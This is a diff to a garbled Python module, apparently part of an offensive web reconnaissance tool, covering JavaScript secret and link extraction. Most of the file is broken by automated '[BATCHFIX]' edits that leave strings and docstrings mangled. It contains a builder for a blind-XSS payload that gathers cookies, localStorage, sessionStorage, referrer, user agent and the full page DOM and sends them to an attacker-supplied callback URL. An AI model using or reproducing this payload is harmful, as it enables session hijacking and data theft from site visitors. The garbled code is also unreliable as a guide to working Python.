@@ -22,7 +22,7 @@ from urllib.parse import urljoin
 class JSIntelligence:
 # [BATCHFIX] Commented metadata/non-Python
 #     pass  # [BATCHFIX] inserted for empty class
-""
+"""
 """
 Intelligence module for JavaScript analysis, secret discovery, and link extraction.#     Ported from jsleak, LinkFinder, and jsluce.
 
@@ -96,7 +96,7 @@ Intelligence module for JavaScript analysis, secret discovery, and link extracti
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 INPUT_SOURCES = ["location.hash", "window.name", "document.cookie", "document.referrer"]
     # Collection Primitives (Ported from 0xSojalSec-ezXSS)
     COLLECTION_PRIMITIVES = {
@@ -132,15 +132,15 @@ INPUT_SOURCES = ["location.hash", "window.name", "document.cookie", "document.re
 """ [BATCHFIX] Commented unmatched parenthesis"""
 #     LINK_REGEX = (
 #         r"(?i)(?:\"|')((?:[a-z]{1,10}://|//)[^\"'/]{1,}\\.[a-z]{2,}[^\"']{0,}|(?:/|\\.\\./|\\./)"  # [BATCHFIX] closed string"  # [BATCHFIX] closed string"'# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 r"[^\"'><,;| *()(%%$^/\\\[\]][^\"'><,;|()]{1,}|[a-z0-9_\-/]{1,}/[a-z0-9_\-/]{1,}\\."  # [BATCHFIX] closed string"'#         r"(?:[a-z]{1,4}|action)(?:[\?|#][^\"|']{0,}|)|[a-z0-9_\-/]{1,}/[a-z0-9_\-/]{3,}"  # [BATCHFIX] closed string"  # [BATCHFIX] closed string"'#         r"(?:[\?|#][^\"|']{0,}|)|[a-z0-9_\-]{1,}\\.(?:php|asp|aspx|jsp|json|action|html|js|txt|xml)"  # [BATCHFIX] closed string"  # [BATCHFIX] closed string"'# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 r"(?:[\?|#][^\"|']{0,}|))(?:\"|')"  # [BATCHFIX] closed string"'    )
 
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 def __init__(self, session: Optional[aiohttp.ClientSession] = None):""""
 self.session = session
         self._own_session = False
@@ -154,7 +154,7 @@ self.session = session
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 async def extract_secrets(self, content: str) -> Dict[str, List[str]]:""""
 # [BATCHFIX] Commented metadata/non-Python
 """         "Extracts secrets and sensitive patterns from JS content."  # [BATCHFIX] closed string"        results = {}
@@ -164,14 +164,14 @@ async def extract_secrets(self, content: str) -> Dict[str, List[str]]:""""
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 results[name] = list(set(matches))""""
 return results
 
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 def extract_links(self, content: str, base_url: str) -> Set[str]:"Extracts and resolves links from JS content.        links = set()
         matches = re.finditer(self.LINK_REGEX, content)
         for match in matches:
@@ -193,25 +193,25 @@ def extract_links(self, content: str, base_url: str) -> Set[str]:"Extracts and r
 # [BATCHFIX] Commented metadata/non-Python
 """ [BATCHFIX] Commented metadata/non-Python"""
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 callback = self.COLLECTION_PRIMITIVES["callback_template"].replace("{callback_url}", callback_url)"# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 payload = f"(function(){{ {callback}"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 payload += "var d={}; try{d.uri=location.toString()}catch(e){}"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 payload += "try{d.cookies=document.cookie}catch(e){}"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 payload += "try{d.ref=document.referrer}catch(e){}"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 payload += "try{d.ua=navigator.userAgent}catch(e){}"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 payload += "try{d.origin=location.origin}catch(e){}"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 payload += "try{d.ls=JSON.stringify(window.localStorage)}catch(e){}"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 payload += "try{d.ss=JSON.stringify(window.sessionStorage)}catch(e){}"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
-""
+"""
 payload += "try{d.dom=document.documentElement.outerHTML}catch(e){}"  # [BATCHFIX] closed string
         if include_screenshot:
             # Note: Requires html2canvas to be present or loaded
@@ -223,10 +223,10 @@ payload += "try{d.dom=document.documentElement.outerHTML}catch(e){}"  # [BATCHFI
 """                 "sendCallback(d);})}catch(e){sendCallback(d);}"  # [BATCHFIX] closed string"            )
         else:
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 payload += "sendCallback(d);"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-""
+"""
 payload += "})();"  # [BATCHFIX] closed string"        return payload
 
     async def analyze_url(self, url: str) -> Dict:
